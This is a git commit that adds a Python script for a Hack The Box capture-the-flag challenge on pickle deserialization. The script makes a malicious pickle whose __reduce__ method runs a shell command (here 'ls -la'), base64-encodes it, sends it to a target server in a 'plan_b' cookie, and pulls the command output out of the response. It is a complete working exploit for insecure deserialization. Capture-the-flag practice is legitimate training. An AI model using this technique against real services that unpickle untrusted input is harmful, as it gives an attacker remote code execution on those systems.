34d3a685c5c131bcfa71738d73329df79f30782b
Niraj Choubey <nir.choubey.2011@gmail.com>
2021-04-18 11:25:11 +0530

    Create baby website rick.py
    exploit code for hack the box baby website rick deserialization challenge

---
+++ CTF/HTB/baby website rick.py
@@ -0,0 +1,23 @@
+import pickle
+import base64
+import os
+import subprocess
+import requests
+import re
+
+class exploit(object):
+    def __reduce__(self):
+        return subprocess.check_output,(['ls','-la'],)
+
+url = 'http://xx.xx.xxx.xxx:xxxx/'
+
+if __name__ == '__main__':
+    pickled = pickle.dumps({'serum':exploit()}, protocol=0)
+    print(pickled)
+    serum = base64.b64encode(pickled)
+    print(base64.b64encode(pickled))
+    custom_cookie = {'plan_b': serum}
+    r = requests.get(url, cookies=custom_cookie)
+    clearn = re.compile('<span>(?s).*<\/span>')
+    print(clearn.search(r.text).group())
+    
